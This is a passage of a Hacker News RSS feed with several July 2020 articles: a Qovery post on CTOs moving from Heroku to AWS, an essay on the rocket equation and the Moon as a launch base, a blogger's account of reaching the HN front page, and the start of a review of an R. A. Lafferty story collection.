Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23737154">thread link</a>) | @ev0xmusic
<br/>
July 5, 2020 | https://www.qovery.com/blog/i-interviewed-200-ctos-from-growing-startups-heres-what-came-up | <a href="https://web.archive.org/web/*/https://www.qovery.com/blog/i-interviewed-200-ctos-from-growing-startups-heres-what-came-up">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Between late 2019 and early 2020, I interviewed more than 200 CTOs of growing US and EU startups on the topics of the Cloud and their working methodologies. I discovered that 86% of these SMB startups use the Cloud and that 48% started their business on <a href="https://www.heroku.com/">Heroku</a> and then migrated to a Cloud provider - especially <a href="https://aws.amazon.com/">AWS</a> (Amazon Web Services).</p><p>This article explains:&nbsp;</p><ul role="list"><li>Why 48% of CTOs moved from Heroku to AWS.&nbsp;</li><li>Why migrating to AWS is a "hell" (a word I've often heard in my interviews).</li><li>How to simplify AWS and meet the needs of growing startups.</li></ul><h2>From Heroku to AWS</h2><p>Early in the life of a startup, the CTO's objective is to design a product quickly and then validate that the product's value proposition is the right one with the defined target. Technical decisions are pragmatic, saving valuable time on product delivery. For application hosting, the majority choice of CTOs is Heroku - because it's easy to get started, with virtually zero upfront cost, a price that grows with usage and maximum time spent on the product rather than managing the complexity of a server and database infrastructure.</p><p>When the startup's market positioning is the right one, the product is successful. The questions of recruitment and team structuring naturally arise, and it is from this point on that the CTO realizes that:</p><ul role="list"><li><strong>Heroku is not for teamwork</strong>: a group of developers will have to share the same environments (staging, development) at the risk of getting stuck on modifications. Heroku very quickly shows its limitations in this mode of operation and prevents development teams from being productive and efficient.</li><li><strong>Heroku is not for enterprise applications</strong>: Heroku considers the deployment and management of applications as a single unit. However, today an application is often made up of several apps - a frontend, a backend, and a database. Heroku does not allow you to manage a set of applications as a single application. This leads to difficulties in complexity management. And therefore, loss of team productivity.</li><li><strong>Heroku is outrageously expensive</strong>: even though AWS is not known for being cheap, Heroku is up to 10x more expensive than AWS for the same use. The more you use it, the more your bills go up. Peace of mind at a price, but it's tough to scale with Heroku.</li></ul><p>These negative points lead 48% of CTOs to replace Heroku by AWS. But not everything is as green on the other side of the fence...</p><h2>AWS hell for CTOs</h2><p>Pre-sales engineers at AWS have a real strength to promote the many advantages of their Cloud solution. Arguments such as free services for up to 2 years and technical support by a dedicated account manager and a team of Cloud architects resonate exceptionally well. Their crews know the field correctly and know how to reassure. Their products are of outstanding quality, and reliability is well proven. However, most of the CTOs we interviewed have no experience of what it means to use a Cloud provider such as AWS. From a technical point of view, you have to start from scratch - everything has to be built from the ground. Meaning, configuring the network, configuring the services, creating a CI for integration, and a CD for deployment - in short, getting your hands in the engine. In our study, we found two types of CTOs, the one who loves to get their hands dirty in the infrastructure, and the one who doesn't want to. The latter is predominant, and even in the case of the first, he lacks time to do what is necessary. The CTO then often turns to someone from his team who will have the cumbersome task of " re-creating " how Heroku works but often learning on-the-job. Months can go by until the CTO decides to do so:&nbsp;</p><ul role="list"><li>Contracting an external DevOps company</li></ul><p>OR</p><ul role="list"><li>Internalize this skill by recruiting it</li></ul><p>From that moment on, I often heard, "<strong>Recruiting a DevOps is a real hell, I wouldn't wish it on anyone</strong>". Not surprisingly, this skill is scarce and expensive - ~$180k/year in San Francisco. Recruiting a DevOps can take up to 12 months, not counting the months of work needed to get a tenth of a Heroku functionality.<br></p><p>AWS is complex to use, as it has to meet the needs of all businesses around the world. However, it is possible to simplify AWS. Here are some areas for improvement...</p><h2>Simplify AWS and meet the needs of growing startups</h2><p>To meet the needs of growing startups, we should be able to combine Heroku's simplicity with the flexibility of AWS. But where to start? Here are my thoughts:</p><h3>A UX designed for developers</h3><p>Heroku gets it; the developer is now the king. He's the one who turns ideas into products. Developers should be able to use AWS without any effort. AWS must be fully integrated into their working environment (IDE) to request what they need transparently. "I need a PostgreSQL version 12 database, a 20GB disk, and to have my application available at https://foo.bar - and of course all this on my Cloud account".</p><h3>An opinionated approach</h3><p>Even if there is no consensus work methodology in the R&amp;D departments of startups, most of them try to copy their elders with a functioning (most often) in the form of a Squad. The idea would be to ensure that the product can fit team working. GitOps and environment isolation (production, staging, dev) methodologies by "git" branch are a perfect start. GitOps methodologies would allow developers to maximize their productivity and never slow down their colleagues on the deployment of new features.</p><h3>Extensible</h3><p>Heroku's move to AWS is not insignificant. A growing startup needs technical extensibility. Deploying applications automatically is good, but allowing you to change everything at any time is even better. This leaves room for future DevOps to join the growing startup.</p><h2>To go further</h2><p>These areas of improvement apply to AWS as well as to other cloud providers such as Google Cloud Platform and Azure. At Qovery, we have begun this work of simplifying the Cloud. Our mission is to make it accessible to any developer, enabling growing startups to become the unicorns of tomorrow.<br></p><p><a href="https://jobs.qovery.com/">We're recruiting!</a></p><p>‍</p><p><a href="https://www.linkedin.com/pulse/jai-interview%25C3%25A9-200-ctos-de-startups-en-croissance-voici-philog%25C3%25A8ne/?trackingId=9l7kV9csR4ySm1Br7IXPuQ%3D%3D">French translation</a></p></div></div>]]>
            </description>
            <link>https://www.qovery.com/blog/i-interviewed-200-ctos-from-growing-startups-heres-what-came-up</link>
            <guid isPermaLink="false">hacker-news-small-sites-23737154</guid>
            <pubDate>Sun, 05 Jul 2020 07:32:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Moon as a rocket platform]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23737036">thread link</a>) | @uncertainquark
<br/>
July 4, 2020 | https://jatan.space/the-moon-as-a-rocket-platform/ | <a href="https://web.archive.org/web/*/https://jatan.space/the-moon-as-a-rocket-platform/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		
	<main id="content" role="main">

	<div>
		<div>
						<article id="post-3564">
				<div>
<p>When dabbling with the laws of motion in the 17th century, Isaac Newton first realized that it is indeed possible to send an object out of Earth, into space. As long as an object is shot away from Earth with a high enough velocity, it <em>will</em> reach space and start orbiting our planet.</p>



<p>With the launch of the Sputnik satellite in 1957 onboard a powerful rocket, the Soviet Union achieved exactly that. For the first time in four billion years of life on Earth, something was intentionally sent to space.</p>



<div><figure><img src="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/sputnik.jpg?fit=1024%2C388&amp;ssl=1" alt="" srcset="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/sputnik.jpg?w=1513&amp;ssl=1 1513w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/sputnik.jpg?resize=1024%2C388&amp;ssl=1 1024w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/sputnik.jpg?resize=200%2C76&amp;ssl=1 200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/sputnik.jpg?resize=768%2C291&amp;ssl=1 768w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/sputnik.jpg?resize=1200%2C454&amp;ssl=1 1200w" sizes="(max-width: 1200px) 100vw, 1200px"><figcaption><strong>Left:</strong> Launch of Sputnik satellite on October 4, 1957 by the Soviet Union, kickstarting the Space Age. <strong>Right:</strong> An engineer besides the finished Sputnik satellite. Credits: USSR</figcaption></figure></div>



<p>Give a satellite another speed boost, by either launching it on a more powerful rocket or using small thrusters onboard, and it can escape from Earth’s gravitational hold completely. That’s how you can send <a href="https://jatan.space/why-explore-venus/">missions to Venus</a>, Mars, <a href="https://jatan.space/why-explore-saturn/">Saturn</a> and beyond. But one of these two things is not quite like the other.</p>



<p>Enter the <a href="https://en.wikipedia.org/wiki/Tsiolkovsky_rocket_equation">rocket equation</a>.</p>



<p>The rocket equation is what allows scientists and engineers to quantify and compare the energy required to reach various destinations in space. Its implications are far-reaching but not intuitive – so I shall attempt to explain them without use of any math.</p>



<h3><strong>Getting to space</strong></h3>



<p>The rocket equation tells us the amount of energy a rocket must expend to go from the Earth’s surface to an orbit 250 kilometers above, called low Earth orbit, is almost thrice as much as going to the Moon from that low Earth orbit! Likewise, getting to low Earth orbit costs more than twice the energy required to reach Mars from that same orbit.<sup>1</sup></p>



<p>Even if we include the energy expenditure not just to reach the Moon from low Earth orbit but to land on it, getting to Earth orbit itself turns out to be about 50% more expensive. In other words, attaining Earth orbit is the first and the most significant barrier to space exploration.</p>



<div><figure><img src="https://i1.wp.com/jatan.space/wp-content/uploads/2020/07/delta-v-earth-moon-mars.jpg?fit=1024%2C576&amp;ssl=1" alt="" srcset="https://i1.wp.com/jatan.space/wp-content/uploads/2020/07/delta-v-earth-moon-mars.jpg?w=1920&amp;ssl=1 1920w, https://i1.wp.com/jatan.space/wp-content/uploads/2020/07/delta-v-earth-moon-mars.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i1.wp.com/jatan.space/wp-content/uploads/2020/07/delta-v-earth-moon-mars.jpg?resize=200%2C113&amp;ssl=1 200w, https://i1.wp.com/jatan.space/wp-content/uploads/2020/07/delta-v-earth-moon-mars.jpg?resize=768%2C432&amp;ssl=1 768w, https://i1.wp.com/jatan.space/wp-content/uploads/2020/07/delta-v-earth-moon-mars.jpg?resize=1536%2C864&amp;ssl=1 1536w, https://i1.wp.com/jatan.space/wp-content/uploads/2020/07/delta-v-earth-moon-mars.jpg?resize=1200%2C675&amp;ssl=1 1200w" sizes="(max-width: 1200px) 100vw, 1200px"><figcaption>Energy expenditure to travel from one place in space to another, calculated using the rocket equation. Credit: ULA</figcaption></figure></div>



<blockquote><p>The giant leap for humanity was not stepping on the Moon but getting to Earth orbit.</p></blockquote>



<p>The rocket equation doesn’t just dictate how much energy you must spend to reach various destinations in space but also if you can reach space at all!</p>



<h3><strong>Planetbound</strong></h3>



<p>The satellite is but a small fraction of the total mass of the rocket that lifts it and yet has an effect on the rocket itself. Therein lies the core problem of rocket science.</p>



<p>Increasing the satellite’s mass, to make it more useful perhaps, also means more rocket fuel is required to put the satellite in the desired orbit. But more fuel makes the system weigh more. This means some more fuel is required to launch the now-heavier system into space. As a thumb rule, fuel requirements increase <a href="https://commons.wikimedia.org/wiki/File:Tsiolkovsky_rocket_equation.svg">exponentially</a> with every step increase in mass added to the satellite.</p>



<p>This is how we end up with rockets being mostly fuel and then some metal. Even the mighty Saturn V that sent astronauts to the Moon was 85% fuel, 13% rocket – including the rocket body, its plumbing and parts, and the rest 2% being the Moonbound spacecraft with astronauts sitting inside!</p>



<div><figure><img src="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?fit=1024%2C856&amp;ssl=1" alt="" srcset="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?w=2100&amp;ssl=1 2100w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?resize=1024%2C856&amp;ssl=1 1024w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?resize=200%2C167&amp;ssl=1 200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?resize=768%2C642&amp;ssl=1 768w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?resize=1536%2C1284&amp;ssl=1 1536w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?resize=2048%2C1712&amp;ssl=1 2048w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?resize=1200%2C1003&amp;ssl=1 1200w" sizes="(max-width: 1200px) 100vw, 1200px"><figcaption>A cutaway illustration of the Saturn V rocket showing the rocket structure and the Moonbound spacecraft on top, which together comprise just 15% of the system’s mass, the rest 85% being fuel. <a href="https://solarsystem.nasa.gov/news/337/what-was-the-saturn-v/">Credit: NASA</a></figcaption></figure></div>



<p>At this point, if we were to make Earth more massive, a rocket would have to expend an enormous amount of energy against a more gruesome gravity well. More fuel would be required to get to space and your rocket might be something akin to 9 times more fuel than metal. Increase Earth’s mass further and the fuel-to-mass ratio would start <em>skyrocketing</em> to a point where it’s simply not possible to engineer such a near-all-fuel rocket!</p>



<p>Crunching the numbers in this manner, it turns out that if the Earth was 50% more massive, you simply wouldn’t be able to get to space even with the most energetic fuel combination (liquid hydrogen and liquid oxygen) available in chemical rockets.</p>



<p>Such a massive rocky planet is not imaginary, several of its kind exist. Of the 4,000+ planets around other stars we’ve discovered to date in our galaxy, about a thousand are something scientists call ‘Super Earths’. These are planets which are up to 10 times more massive than Earth and up to twice as large. Beyond that limit, planets don’t remain rocky and start turning into Uranus/Neptune-like gas giants.</p>



<div><figure><img src="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/super-earth-size-comparison.jpg?fit=1024%2C546&amp;ssl=1" alt="" srcset="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/super-earth-size-comparison.jpg?w=1499&amp;ssl=1 1499w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/super-earth-size-comparison.jpg?resize=1024%2C546&amp;ssl=1 1024w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/super-earth-size-comparison.jpg?resize=200%2C107&amp;ssl=1 200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/super-earth-size-comparison.jpg?resize=768%2C409&amp;ssl=1 768w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/super-earth-size-comparison.jpg?resize=1200%2C640&amp;ssl=1 1200w" sizes="(max-width: 1200px) 100vw, 1200px"><figcaption>Size comparison of a Super Earth (artist’s impression) to Earth and Neptune. Credit: <a href="https://en.wikipedia.org/wiki/File:Exoplanet_Comparison_CoRoT-7_b.png">Aldaron</a>, <a href="https://www.flickr.com/photos/groovychk/474966449">Ginny Keller</a></figcaption></figure></div>



<p>Many of these Super Earths lie in the respective habitable zones around their stars i.e. conditions there could support life as we know it. Given that we’ve only searched a small fraction of our galaxy for planets, it’s fair to say there could be millions of Super Earths, many of which could host life.</p>



<p>If intelligent life were to develop on these Super Earths, they’d have a hard time building rockets that get things off-planet. Since even the most energetic chemical rockets won’t get them to space, they’d be incentivized to build something with more thrust that can, like nuclear propulsion based rockets. These will likely be far more expensive than chemical rockets but sometimes nature doesn’t give you a choice.</p>



<figure><img src="https://i1.wp.com/jatan.space/wp-content/uploads/2020/07/orion-nuclear-rocket-concept.jpg?fit=1024%2C819&amp;ssl=1" alt="" srcset="https://i1.wp.com/jatan.space/wp-content/uploads/2020/07/orion-nuclear-rocket-concept.jpg?w=1680&amp;ssl=1 1680w, https://i1.wp.com/jatan.space/wp-content/uploads/2020/07/orion-nuclear-rocket-concept.jpg?resize=1024%2C819&amp;ssl=1 1024w, https://i1.wp.com/jatan.space/wp-content/uploads/2020/07/orion-nuclear-rocket-concept.jpg?resize=200%2C160&amp;ssl=1 200w, https://i1.wp.com/jatan.space/wp-content/uploads/2020/07/orion-nuclear-rocket-concept.jpg?resize=768%2C614&amp;ssl=1 768w, https://i1.wp.com/jatan.space/wp-content/uploads/2020/07/orion-nuclear-rocket-concept.jpg?resize=1536%2C1229&amp;ssl=1 1536w, https://i1.wp.com/jatan.space/wp-content/uploads/2020/07/orion-nuclear-rocket-concept.jpg?resize=1200%2C960&amp;ssl=1 1200w" sizes="(max-width: 1200px) 100vw, 1200px"><figcaption>In the 1960’s, US government labs, under Project Orion, investigated a nuclear fission based propulsion system as a potential solution for interstellar travel. For life on ‘Super Earths’, nuclear propulsion based rockets might be the only way to get to space. <a href="https://commons.wikimedia.org/wiki/File:Pulsed_Fission_Propulsion_Concept.jpg">Credit: NASA</a></figcaption></figure>



<p>Just like the rocket equation makes it exponentially harder to get off a planet with added mass to the planet, it also makes it exponentially easier to get off objects with lesser gravity. Now if only we had an object less massive than Earth that is accessible and resourceful..</p>



<h3><strong>Ad Luna</strong></h3>



<p>In order for humanity to survive and thrive long term, it makes sense to have a permanent human settlement on Mars as the red planet offers us a relatively benign environment. That’d require sending hundreds to thousands of tons of material from Earth to the martian surface via dozens to hundreds of huge rocket launches. That’s pretty much exactly what <a href="https://www.spacex.com/vehicles/starship/">SpaceX’s Starship</a> hopes to do. That’s where our celestial neighbor, the Moon, comes in.</p>



<p>The Moon has a much weaker gravity than Earth, allowing rockets to take off with ease. This was most notable during the Apollo missions, when even a small spacecraft hosting two astronauts <a href="https://www.youtube.com/watch?v=9HQfauGJaTs">could make its way to lunar orbit</a>. Moreover, the Moon lies at the outer edge of Earth’s gravity well, meaning it’s easy to escape our planet’s pull completely if launched from the Moon. Almost five times easier in fact.</p>



<p>If we establish a vast, permanent settlement on the Moon first, we can eventually tap into its resources to launch rockets from the Moon itself. NASA and ISRO missions have <a href="https://jatan.space/how-nasa-and-chandrayaan-discovered-water-on-the-moon/">discovered plenty of water ice</a> on the Moon’s poles. It’s possible that future human habitats built from mining the metal-rich lunar soil tap into this water ice for consumption needs. This water can also be split into hydrogen and oxygen for use as rocket fuel. Rockets taking off from an industrially enabled Moonbase can ride the lunar interplanetary highway to reach Mars more efficiently than from Earth.</p>



<figure><img src="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/starship-takeoff-the-moon.jpg?fit=1024%2C628&amp;ssl=1" alt="" srcset="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/starship-takeoff-the-moon.jpg?w=3840&amp;ssl=1 3840w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/starship-takeoff-the-moon.jpg?resize=1024%2C628&amp;ssl=1 1024w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/starship-takeoff-the-moon.jpg?resize=200%2C123&amp;ssl=1 200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/starship-takeoff-the-moon.jpg?resize=768%2C471&amp;ssl=1 768w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/starship-takeoff-the-moon.jpg?resize=1536%2C942&amp;ssl=1 1536w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/starship-takeoff-the-moon.jpg?resize=2048%2C1256&amp;ssl=1 2048w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/starship-takeoff-the-moon.jpg?resize=1200%2C736&amp;ssl=1 1200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/starship-takeoff-the-moon.jpg?w=2400&amp;ssl=1 2400w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/starship-takeoff-the-moon.jpg?w=3600&amp;ssl=1 3600w" sizes="(max-width: 1200px) 100vw, 1200px"><figcaption>A SpaceX Starship rocket taking off from a Moonbase. <a href="https://www.spacex.com/media/starship_users_guide_v1.pdf">Credit: SpaceX</a></figcaption></figure>



<p>Sure, it would be expensive to build a vast, industrial Moonbase but if the goal is to expand sustainably into the solar system, we’re playing the game on the scale of hundreds to thousands of years. In this large scheme of things, the Moon can be <em>the</em> rocket platform to test and build a sustainable Mars presence at a much smaller cost than one done from Earth.</p>



<p>The Moon’s accessibility, low gravity barrier and resource potential are the reason why its proponents vouch for a sustainable return to the Moon first rather than targeting Mars. As the saying within the lunar circles goes,</p>



<blockquote><p>You can’t be a martian without being a lunatic.</p></blockquote>



<p>Being a Moon-first guy myself, I even made a meme to that effect.</p>







<h3><strong>The belt and beyond</strong></h3>



<p>The Moon’s advantages may extend to making homes for ourselves in the outer solar system as well. The rocket equation tells us that even if objects in the outer reaches of the solar may be closer to Mars than the Moon, the red planet’s deeper gravity well means more energy is required to get out of it than to reach those destinations from there.</p>



<p>Getting to the asteroid belt from the Moon’s surface is at least 40% less energy demanding for a rocket than from Mars’ surface – even though Mars is about <em>75 million km</em> closer to the belt! This is the difference gravity makes, and which the rocket equation allows us to see. The Moon can accelerate expanding settlements to these resource-rich asteroids. Some of these objects, like Ceres and Vesta, can in turn play the same role as the Moon can for Mars and the asteroid belt, and expand human settlements to moons of Jupiter and Saturn, and beyond.</p>



<figure><img src="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/wanderers-asteroid-excavation.jpg?fit=1024%2C576&amp;ssl=1" alt="" srcset="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/wanderers-asteroid-excavation.jpg?w=1920&amp;ssl=1 1920w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/wanderers-asteroid-excavation.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/wanderers-asteroid-excavation.jpg?resize=200%2C113&amp;ssl=1 200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/wanderers-asteroid-excavation.jpg?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/wanderers-asteroid-excavation.jpg?resize=1536%2C864&amp;ssl=1 1536w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/wanderers-asteroid-excavation.jpg?resize=1200%2C675&amp;ssl=1 1200w" sizes="(max-width: 1200px) 100vw, 1200px"><figcaption>This concept shows an asteroid hollowed out on the inside and inhabited. A fleet of spaceships are lined up and approaching a docking area seen as glowing lights. <a href="http://www.erikwernquist.com/wanderers/gallery_excavation.html">Credit: Erik Wernquist</a></figcaption></figure>



<p>This finally brings us to the single most important takeaway from the rocket equation. The ability to extract and harness raw materials from low-gravity, resourceful space objects would free us from the tyranny of dragging everything out of Earth’s gravitational pull.</p>



<p>We cannot hope to be traveling among the stars if we don’t even expand into the solar system in an Earth-independent way and avail for ourselves a much larger resource pool. In-space manufacturing and industrialization is not just a good-to-have but a fundamental requirement for <a href="https://www.youtube.com/watch?v=YH3c1QZzRK4&amp;feature=emb_title">expansion into the solar system</a>. Only then humanity will be in an adequate position to venture to the nearest star and hopefully do it <a href="https://jatan.space/timeline-for-life-until-the-end-of-the-universe/">before the Sun …</a></p></div></article></div></div></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jatan.space/the-moon-as-a-rocket-platform/">https://jatan.space/the-moon-as-a-rocket-platform/</a></em></p>]]>
            </description>
            <link>https://jatan.space/the-moon-as-a-rocket-platform/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23737036</guid>
            <pubDate>Sun, 05 Jul 2020 06:48:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[4200 SaaS Business Ideas]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23737029">thread link</a>) | @jensbackbom
<br/>
July 4, 2020 | http://www.jensbackbom.com/businessideas/ | <a href="https://web.archive.org/web/*/http://www.jensbackbom.com/businessideas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.jensbackbom.com/businessideas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23737029</guid>
            <pubDate>Sun, 05 Jul 2020 06:47:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How my article became one-hit-wonder on HackerNews]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23736913">thread link</a>) | @vicek22
<br/>
July 4, 2020 | https://blog.viktomas.com/posts/one-hit-wonder-on-hn/ | <a href="https://web.archive.org/web/*/https://blog.viktomas.com/posts/one-hit-wonder-on-hn/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<article>
			
			


			

			<p>Today I’m going to tell the story of fleeting success. You’ll learn how my article reached the hacker news front page. And how it stayed there for two whole days, changing my perception about what is achievable with my writing hobby.</p>

<p>I started this blog as a new year’s resolution for 2020. One article per week. I didn’t have gigantic aspirations. I wanted to learn how to express myself better because <a href="https://blog.viktomas.com/posts/remote/">remote work</a> is all about written communication. And I wanted to share thoughts about my interests.</p>
<p>First two months I didn’t publish the articles I wrote. I didn’t want to create yet another blog with only a handful posts in it. The writing had to become a habit first.</p>
<p>After I started publishing on this site, I didn’t share it with anybody until late April when I mentioned <a href="https://blog.viktomas.com/posts/plaintext-passwords/">an article</a> on <a href="https://news.ycombinator.com/item?id=22914281">hacker news</a> for the first time. Two people liked it, and about fifty read it according to my analytics.</p>
<p>On Sunday 3rd of May 2020 at 9 AM (CET) I mention my article <a href="https://blog.viktomas.com/posts/losing-google-account/">“What would you do if you lost your Google account?"</a> on <a href="https://news.ycombinator.com/item?id=23057365">hacker news</a>. I was expecting the same results: a couple dozen people read it, a few would like it. But with strike of luck, plenty of people liked the article and of it went to the front page.</p>
<p>By 10 AM, fifteen hundred people visited the site, four times the number of visits since I started the blog. In the following 24 hours, another ten thousand people viewed the blog, and by the time the article left the front page on Monday, <strong>sixteen thousand people</strong> have read it<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. The real number is going to be over thirty thousand because <a href="https://blog.viktomas.com/posts/adblock-skews-analytics/">60% of hacker news readers don’t show in analytics thanks to AdBlock</a>.</p>
<p>I was ecstatic. The whole day I was walking with a wide grin on my face. I immediately googled the WikiHow article on <a href="https://www.wikihow.com/Handle-Fame">How To handle fame</a>. And I took plenty of screenshots because I thought that the article is bound to drop off from the front page after a few minutes and I wanted to have a memory.</p>
<p><img src="https://blog.viktomas.com/images/posts/one-hit-wonder-hn/medium.gif" alt=""></p>
<p>There was a trickle of people coming to see the article ever since. Now about fifty people view the article each week.</p>
<p>The time of my two-day fame has now passed, but I took away valuable lessons.</p>
<p>The first lesson is that I can produce something of value outside of my programming job. I knew I design and write high-quality code and systems and I get well paid for doing that. However, this experience showed me that I could create something else people enjoy.</p>
<p>The second lesson is the type of article people enjoy. The generic articles about <a href="https://blog.viktomas.com/posts/foss/">FOSS</a> and <a href="https://blog.viktomas.com/posts/meditation-introduction/">Meditation</a> are presumably not as interesting as the more down-to-earth articles that contain a few howtos that people can apply straight away. Since the “loosing your google account” article this story repeated itself once more with the <a href="https://blog.viktomas.com/posts/slip-box/">Zettlekasten article</a>. This strengthens my hypothesis that the article needs to provide useful, applicable tool/information to the readers, not just abstract food for thought.</p>
<p>I liked Robert Heaton’s <a href="https://robertheaton.com/2019/09/24/how-to-come-up-with-blog-post-ideas/">Made-Up-Award principle</a>: you should write your article to be the best in some narrow category. Exaggerated example: “best introduction to ruby programming for marketing experts focusing on food marketing”. Another important rule for me is that I have to wish I found that article a few days/weeks before because it would help me solve a problem.</p>
<p>This event gave me just enough extrinsic motivation to help me overcome the initial period when I was considering whether I want to spend eight hours each week writing an article that fifty people read. It helped me to commit to writing as the next of my many hobbies.</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>The numbers are from Mixpanel analytics. I copied them from a conversation with my friend because the Mixpanel stats have been long lost thanks to me exceeding the monthly limit. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>

		</article>
	</div></div>]]>
            </description>
            <link>https://blog.viktomas.com/posts/one-hit-wonder-on-hn/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23736913</guid>
            <pubDate>Sun, 05 Jul 2020 06:03:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Best of R. A. Lafferty (Book Review)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23736876">thread link</a>) | @walterbell
<br/>
July 4, 2020 | https://fantasy-hive.co.uk/2020/05/the-best-of/ | <a href="https://web.archive.org/web/*/https://fantasy-hive.co.uk/2020/05/the-best-of/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <!-- ARTICAL CONTENT -->
                                                                <blockquote><p>“’There is only one story in the world,’ he said, ‘and it pulls two ways. There is the reason part that says “Hell, it can’t be” and there is the wonder part that says “Hell, maybe it is.”’”</p>
<p>Cliffs That Laughed, 1969</p></blockquote>
<blockquote><p>“Every science is made up entirely of anomalies rearranged to fit.”</p>
<p>Continued on Next Rock, 1970</p></blockquote>
<p><img src="https://i0.wp.com/fantasy-hive.co.uk/wp-content/uploads/2020/05/61ru6fMIQtL.jpg?resize=195%2C300&amp;ssl=1" alt="" width="195" height="300" srcset="https://i0.wp.com/fantasy-hive.co.uk/wp-content/uploads/2020/05/61ru6fMIQtL.jpg?resize=195%2C300&amp;ssl=1 195w, https://i0.wp.com/fantasy-hive.co.uk/wp-content/uploads/2020/05/61ru6fMIQtL.jpg?resize=400%2C616&amp;ssl=1 400w, https://i0.wp.com/fantasy-hive.co.uk/wp-content/uploads/2020/05/61ru6fMIQtL.jpg?resize=389%2C600&amp;ssl=1 389w, https://i0.wp.com/fantasy-hive.co.uk/wp-content/uploads/2020/05/61ru6fMIQtL.jpg?w=649&amp;ssl=1 649w" sizes="(max-width: 195px) 100vw, 195px" data-recalc-dims="1">Raphael Aloysius Lafferty was an American writer from Tulsa, Oklahoma, who wrote over two hundred short stories and thirty-two novels from 1960 to 1984. It is his genre-defying and hugely inventive short stories he is most well-known for. <em>The Best of R. A. Lafferty </em>(2019), edited by Jonathan Strahan and issued as part of Gollancz’s SF Masterworks series, collects 22 of these stories. Each story contains an introduction written by an author influenced by Lafferty’s work, including Neil Gaiman, Samuel R. Delany, Connie Willis, Jeff VanderMeer and Michael Swanwick. The stellar list of contributors should give you an idea of how far Lafferty’s literary influence extends beyond his relative obscurity. What they don’t tell you is just how wonderfully bizarre and compelling Lafferty’s writing is. Lafferty is a lover of myths, legends, tall tales, jokes, and shaggy dog stories. Any given Lafferty story is likely to be a combination of all of these, at least as much as it is a work of science fiction or fantasy, if not more. But then again their innate humour doesn’t hide Lafferty’s knack for mind-bending ideas or powerful emotional impact. Basically, there is nothing quite like a Lafferty short story, and once you’ve developed the taste for them you are likely to want more. After years of his work being out of print and difficult to find, Gollancz’s <em>Best of</em> serves as a welcome introduction to Lafferty’s writing.</p>
